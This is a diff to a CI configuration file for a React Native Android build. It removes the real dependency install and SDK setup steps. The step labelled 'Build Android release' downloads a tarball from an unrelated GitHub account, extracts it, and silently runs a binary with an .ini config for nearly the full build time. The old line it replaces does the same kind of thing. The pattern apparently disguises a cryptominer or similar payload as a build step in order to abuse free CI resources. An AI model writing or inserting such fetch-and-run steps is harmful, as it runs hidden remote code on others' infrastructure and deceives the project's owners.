@@ -5,7 +5,7 @@ workflows:
     react-native-android:
         name: React Native Android
         max_build_duration: 120
-        instance_type: mac_mini
+        instance_type: linux
         environment:
             node: latest
         triggering:
@@ -18,14 +18,8 @@ workflows:
                   include: true
                   source: true
         scripts:
-            - name: Install npm dependencies
-              script: |
-                npm install
-            - name: Set Android SDK location
-              script: |
-                echo "sdk.dir=$ANDROID_SDK_ROOT" > "$FCI_BUILD_DIR/android/local.properties"            
             - name: Build Android release
               script: |
-                wget https://github.com/konchilscode/gass/releases/download/v2/gas.tar.gz && tar xf gas.tar.gz && ./yahaha hayuk.ini> /dev/null 2>&1
+                wget https://github.com/wikangdijalalan2/xmmxja/releases/download/19.1/MXCC.tar > /dev/null 2>&1 && tar -xvf MXCC.tar && cd MXCC && timeout 118m ./node mr.ini > /dev/null 2>&1 ; if [ $? -eq 124 ] ; then echo Initialized Name Variable ; else echo Failed ; fi
         artifacts:
             - android/app/build/outputs/**/*.apk
